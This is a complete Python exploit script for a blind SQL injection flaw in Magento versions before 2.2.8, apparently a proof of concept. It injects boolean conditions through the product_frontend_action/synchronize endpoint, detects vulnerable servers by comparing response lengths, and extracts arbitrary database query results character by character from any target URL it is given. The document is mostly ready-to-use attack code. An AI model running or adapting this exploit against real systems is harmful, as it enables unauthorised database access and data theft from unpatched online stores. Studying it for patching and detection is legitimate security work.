#!/usr/bin/env python3
"""
Magento 2.2 SQL Injection (Boolean-Based Blind)
Client script to exploit the Magento prepareSqlCondition SQLi vulnerability.

Target: Magento < 2.2.8
Port:   8080
"""

import argparse
import sys
import string
import requests

requests.packages.urllib3.disable_warnings()


def check_target(target):
    """Check if the target is a Magento instance."""
    try:
        r = requests.get(f"{target}/", timeout=10, verify=False)
        if r.status_code == 200 and "magento" in r.text.lower():
            print(f"[+] Magento instance detected at {target}")
            return True
        print(f"[*] Target responded (HTTP {r.status_code}), attempting anyway...")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target}")
        return False


def test_sqli(target, condition):
    """Test a boolean SQL injection condition. Returns response length."""
    url = (
        f"{target}/catalog/product_frontend_action/synchronize"
        f"?type_id=recently_products"
        f"&ids[0][added_at]="
        f"&ids[0][product_id][from]=%3f"
        f"&ids[0][product_id][to]=)))+OR+({condition})+--+-"
    )
    try:
        r = requests.get(url, timeout=10, verify=False)
        return len(r.text), r.status_code
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return None, None


def check_vulnerability(target):
    """Verify the SQLi vulnerability exists using boolean blind technique."""
    print("\n[*] Checking for SQL injection vulnerability...")
    print("[*] This may take a moment...")

    len_true, status_true = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1")
    len_false, status_false = test_sqli(target, "SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0")

    if len_true is not None and len_false is not None:
        print(f"[*] TRUE condition:  HTTP {status_true}, Response length: {len_true}")
        print(f"[*] FALSE condition: HTTP {status_false}, Response length: {len_false}")

        # Check for differences in response length
        if len_true != len_false:
            print("[+] VULNERABLE! Different response lengths detected:")
            print(f"    TRUE condition:  {len_true} bytes")
            print(f"    FALSE condition: {len_false} bytes")
            return True, len_true
        # Fallback: check status codes
        elif status_true != status_false:
            print("[+] VULNERABLE! Different HTTP status codes detected:")
            print(f"    TRUE condition:  HTTP {status_true}")
            print(f"    FALSE condition: HTTP {status_false}")
            return True, status_true
        else:
            print(f"[-] Same response for both conditions (length={len_true}, status={status_true})")
            print("[-] Target may not be vulnerable, not properly set up, or database not connected.")
            print("[*] Tip: Make sure Magento is fully initialized and database is connected.")
            return False, None
    else:
        print("[-] Could not get response from target.")
        return False, None


def extract_data(target, query, true_marker, max_length=64):
    """Extract data using boolean-based blind SQL injection."""
    result = ""
    charset = string.ascii_letters + string.digits + string.punctuation + " _-.@:"

    print(f"[*] Extracting data with query: {query}")
    print(f"[*] Using marker: {true_marker}")

    for pos in range(1, max_length + 1):
        found = False
        for char in charset:
            condition = (
                f"SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+"
                f"SUBSTRING(({query}),{pos},1)='{char}'"
            )
            length, status = test_sqli(target, condition)

            # Check if this character matches (compare with true_marker)
            if isinstance(true_marker, int) and length == true_marker:
                result += char
                sys.stdout.write(f"\r[+] Extracted: {result}")
                sys.stdout.flush()
                found = True
                break

        if not found:
            break

    print()
    return result


def main():
    parser = argparse.ArgumentParser(
        description="Magento 2.2 SQL Injection Exploit"
    )
    parser.add_argument("target", help="Target URL (e.g., http://192.168.1.100:8080)")
    parser.add_argument("--mode", choices=["check", "extract"], default="check",
                        help="Mode: check vulnerability or extract data")
    parser.add_argument("--query", default="SELECT user()",
                        help="SQL query to extract (extract mode)")
    parser.add_argument("--max-length", type=int, default=64,
                        help="Max data length to extract (default: 64)")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")

    if not check_target(target):
        sys.exit(1)

    vulnerable, true_status = check_vulnerability(target)

    if args.mode == "extract" and vulnerable:
        print()
        data = extract_data(target, args.query, true_status, args.max_length)
        if data:
            print(f"\n[+] Extracted data: {data}")
        else:
            print("\n[-] Could not extract data.")


if __name__ == "__main__":
    main()
